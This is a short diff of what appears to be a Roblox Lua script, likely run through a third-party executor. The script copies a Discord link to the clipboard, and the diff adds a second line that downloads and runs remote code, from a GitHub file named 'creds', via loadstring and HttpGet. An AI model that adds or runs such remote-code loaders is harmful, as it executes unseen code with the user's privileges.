@@ -43,3 +43,6 @@ setclipboard(DiscordLink) -- Copy Discord link to clipboard
 print("The Discord link has been copied to your clipboard.") -- Print completion message
  
 loadstring(game:HttpGet('https://raw.githubusercontent.com/ilyanaes/1/main/notify'))()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/flowDS/universal-stand/main/creds'))()
+
